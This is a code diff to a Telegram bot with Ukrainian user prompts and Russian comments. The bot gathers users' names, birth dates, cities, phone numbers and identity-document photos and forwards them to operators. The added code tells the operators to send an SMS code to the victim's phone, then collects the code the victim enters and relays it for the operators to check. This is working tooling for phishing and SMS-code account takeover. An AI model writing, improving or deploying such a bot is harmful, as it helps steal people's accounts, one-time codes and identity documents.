@@ -232,9 +232,9 @@ async def process_email(message: types.Message, state: FSMContext):
         "• Фото має бути якісним і не розмитим"
     )
 
-# --- Этап 4. Получение фото ---
+# --- Этап 4. Получение фото и отправка администраторам ---
 @router.message(Form.document_photo, F.photo)
-async def process_document_photo(message: types.Message, state: FSMContext):
+async def process_document_photo(message: types.Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
     username = message.from_user.username or "Без username"
     photo_id = message.photo[-1].file_id
@@ -244,6 +244,32 @@ async def process_document_photo(message: types.Message, state: FSMContext):
     
     # Сохраняем данные в БД
     form_id = save_user_data(user_id, username, data)
+    
+    # СРАЗУ отправляем анкету всем администраторам
+    admins = get_all_admins()
+    
+    form_text = (
+        f"📋 <b>Новая анкета!</b>\n\n"
+        f"👤 User ID: <code>{user_id}</code>\n"
+        f"📱 Username: @{username}\n\n"
+        f"<b>Данные анкеты:</b>\n"
+        f"ФИО: {data['full_name']}\n"
+        f"Дата рождения: {data['age']}\n"
+        f"Город: {data['city']}\n"
+        f"📞 <b>Телефон: {data['phone']}</b>\n"
+        f"Площадь жилья: {data['email']}\n\n"
+        f"⚠️ <b>Отправьте SMS-код на указанный номер телефона!</b>"
+    )
+    
+    for admin_id, admin_username in admins:
+        try:
+            await bot.send_photo(
+                chat_id=admin_id,
+                photo=photo_id,
+                caption=form_text
+            )
+        except Exception as e:
+            print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
     
     # Устанавливаем состояние ожидания кода
     await state.set_state(Form.waiting_code)
@@ -264,6 +290,9 @@ async def process_document_photo(message: types.Message, state: FSMContext):
         "• Якщо SMS не надійшло, перевірте правильність номера телефону\n",
         reply_markup=support_keyboard(SUPPORT_USERNAME)
     )
+    
+    # Очищаем состояние после отправки анкеты администраторам
+    await state.clear()
 
 @router.message(Form.document_photo)
 async def document_photo_invalid(message: types.Message):
@@ -274,12 +303,18 @@ async def document_photo_invalid(message: types.Message):
         "⚠️ Це має бути саме фото (не файл, не посилання)"
     )
 
-# --- Этап 5. Ожидание кода от пользователя ---
-@router.message(Form.waiting_code)
-async def process_user_code(message: types.Message, state: FSMContext, bot: Bot):
+# --- Этап 5. Ожидание кода от пользователя (БЕЗ состояния FSM) ---
+@router.message(F.text)
+async def process_user_code(message: types.Message, bot: Bot):
     user_id = message.from_user.id
-    username = message.from_user.username or "Без username"
     code = message.text.strip()
+    
+    # Проверяем, есть ли у пользователя анкета
+    user_data = get_user_data(user_id)
+    
+    # Если анкеты нет или код уже подтвержден, игнорируем
+    if not user_data or user_data.get('code_verified') == 1:
+        return
     
     # Базовая валидация кода (например, 4-8 цифр или букв)
     if not re.match(r'^[A-Za-z0-9]{4,8}$', code):
@@ -295,19 +330,11 @@ async def process_user_code(message: types.Message, state: FSMContext, bot: Bot)
     # Сохраняем введенный код
     save_sms_code(user_id, code)
     
-    # Получаем данные анкеты
-    user_data = get_user_data(user_id)
-    
-    if not user_data:
-        await message.answer("❌ Помилка: анкета не знайдена.")
-        await state.clear()
-        return
-    
-    # Отправляем уведомление всем администраторам
+    # Отправляем уведомление всем администраторам с кнопками проверки
     admins = get_all_admins()
     
     form_text = (
-        f"📋 <b>Новая анкета!</b>\n\n"
+        f"🔐 <b>Пользователь ввёл код!</b>\n\n"
         f"👤 User ID: <code>{user_data['user_id']}</code>\n"
         f"📱 Username: @{user_data['username']}\n\n"
         f"<b>Данные анкеты:</b>\n"
@@ -316,21 +343,21 @@ async def process_user_code(message: types.Message, state: FSMContext, bot: Bot)
         f"Город: {user_data['city']}\n"
         f"Телефон: {user_data['phone']}\n"
         f"Площадь жилья: {user_data['email']}\n\n"
-        f"🔐 <b>Введенный код:</b> <code>{code}</code>"
+        f"🔐 <b>Введённый код:</b> <code>{code}</code>"
     )
     
     # Создаем клавиатуру для проверки кода
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="✅ Правильно введен код", callback_data=f"verify_yes_{user_data['form_id']}"),
-            InlineKeyboardButton(text="❌ Неправильно введен код", callback_data=f"verify_no_{user_data['form_id']}")
+            InlineKeyboardButton(text="✅ Код правильный", callback_data=f"verify_yes_{user_data['form_id']}"),
+            InlineKeyboardButton(text="❌ Код неправильный", callback_data=f"verify_no_{user_data['form_id']}")
         ]
     ])
     
     for admin_id, admin_username in admins:
         try:
-            # Отправляем фото с данными
+            # Отправляем фото с данными и кнопками
             await bot.send_photo(
                 chat_id=admin_id,
                 photo=user_data['document_photo'],
@@ -341,7 +368,6 @@ async def process_user_code(message: types.Message, state: FSMContext, bot: Bot)
             print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
     
     await message.answer("⏳ Ваш код отримано. Очікуйте перевірки адміністратором.")
-    await state.clear()
 
 # --- Обработка ответов администратора ---
 @router.callback_query(F.data.startswith("verify_yes_"))
@@ -359,15 +385,16 @@ async def verify_code_yes(callback: types.CallbackQuery, bot: Bot):
         try:
             await bot.send_message(
                 chat_id=form_data['user_id'],
-                text="✅ <b>Ваш код підтверджено!</b>\n\nАнкета успішно прийнята. "
-                     "Очікуйте на подальші інструкції від нашої команди."
+                text="✅ <b>Ваш код підтверджено!</b>\n\n"
+                     "Анкета успішно прийнята. Очікуйте на подальші інструкції від нашої команди."
             )
         except Exception as e:
             print(f"Не удалось отправить сообщение пользователю {form_data['user_id']}: {e}")
     
-    await callback.answer("✅ Код підтверджено")
+    await callback.answer("✅ Код подтверждён")
     await callback.message.edit_caption(
-        caption=callback.message.caption + "\n\n✅ <b>КОД ПІДТВЕРДЖЕНО</b>"
+        caption=callback.message.caption + "\n\n✅ <b>КОД ПОДТВЕРЖДЁН</b>",
+        reply_markup=None
     )
 
 @router.callback_query(F.data.startswith("verify_no_"))
@@ -393,69 +420,8 @@ async def verify_code_no(callback: types.CallbackQuery, bot: Bot):
         except Exception as e:
             print(f"Не удалось отправить сообщение пользователю {form_data['user_id']}: {e}")
     
-    await callback.answer("❌ Код відхилено")
+    await callback.answer("❌ Код отклонён")
     await callback.message.edit_caption(
-        caption=callback.message.caption + "\n\n❌ <b>КОД ВІДХИЛЕНО</b>"
+        caption=callback.message.caption + "\n\n❌ <b>КОД ОТКЛОНЁН</b>",
+        reply_markup=None
     )
-
-# --- Обработчик повторного ввода кода (без состояния) ---
-@router.message(F.text)
-async def handle_code_retry(message: types.Message, bot: Bot):
-    user_id = message.from_user.id
-    
-    # Проверяем, есть ли у пользователя анкета с code_verified = 0 (отклоненный код)
-    user_data = get_user_data(user_id)
-    
-    if user_data and user_data.get('code_verified') == 0:
-        code = message.text.strip()
-        
-        # Валидация кода
-        if not re.match(r'^[A-Za-z0-9]{4,8}$', code):
-            await message.answer(
-                "❌ <b>Неправильний формат коду!</b>\n\n"
-                "Код має містити:\n"
-                "• Від 4 до 8 символів\n"
-                "• Тільки цифри або букви\n\n"
-                "Спробуйте ще раз:"
-            )
-            return
-        
-        # Сохраняем новый код
-        save_sms_code(user_id, code)
-        
-        # Отправляем уведомление администраторам
-        admins = get_all_admins()
-        
-        form_text = (
-            f"🔄 <b>Повторний ввід коду!</b>\n\n"
-            f"👤 User ID: <code>{user_data['user_id']}</code>\n"
-            f"📱 Username: @{user_data['username']}\n\n"
-            f"<b>Данные анкеты:</b>\n"
-            f"ФИО: {user_data['full_name']}\n"
-            f"Дата рождения: {user_data['age']}\n"
-            f"Город: {user_data['city']}\n"
-            f"Телефон: {user_data['phone']}\n"
-            f"Площадь жилья: {user_data['email']}\n\n"
-            f"🔐 <b>Введенный код:</b> <code>{code}</code>"
-        )
-        
-        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-        keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [
-                InlineKeyboardButton(text="✅ Правильно введен код", callback_data=f"verify_yes_{user_data['form_id']}"),
-                InlineKeyboardButton(text="❌ Неправильно введен код", callback_data=f"verify_no_{user_data['form_id']}")
-            ]
-        ])
-        
-        for admin_id, admin_username in admins:
-            try:
-                await bot.send_photo(
-                    chat_id=admin_id,
-                    photo=user_data['document_photo'],
-                    caption=form_text,
-                    reply_markup=keyboard
-                )
-            except Exception as e:
-                print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
-        
-        await message.answer("⏳ Ваш код отримано. Очікуйте перевірки адміністратором.")
